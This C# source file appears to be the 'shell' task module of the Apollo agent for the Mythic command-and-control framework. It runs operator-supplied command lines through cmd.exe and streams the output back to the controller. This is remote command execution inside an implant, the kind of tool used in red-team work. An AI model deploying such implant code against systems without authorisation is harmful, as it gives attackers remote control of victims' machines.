﻿using ApolloInterop.Classes;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;

namespace Tasks
{
    public class shell : Tasking
    {
        public shell(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Kill()
        {
            _cancellationToken.Cancel();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(()=>
            {
                Process proc = null;
                if (string.IsNullOrEmpty(_data.Parameters))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            "No command line arguments passed.", true, "error"));
                } else
                {
                    ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
                    proc = _agent.GetProcessManager().NewProcess("cmd.exe", $"/S /c {_data.Parameters}");
                    proc.OutputDataReceived += DataReceived;
                    proc.ErrorDataReceieved += DataReceived;
                    proc.Exit += Proc_Exit;
                    if (!proc.Start())
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            $"Failed to start process. Reason: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}",
                            true,
                            "error"));
                    } else
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            "", false, "", new IMythicMessage[]
                            {
                                new Artifact
                                {
                                    BaseArtifact = "ProcessCreate",
                                    ArtifactDetails = $"Started cmd.exe {_data.Parameters} (PID: {proc.PID})"
                                }
                            }));
                    }
                }
            }, _cancellationToken.Token);
        }

        private void Proc_Exit(object sender, EventArgs e)
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                "", true));
        }

        private void DataReceived(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    e.Data,
                    false,
                    ""));
            }
        }
    }
}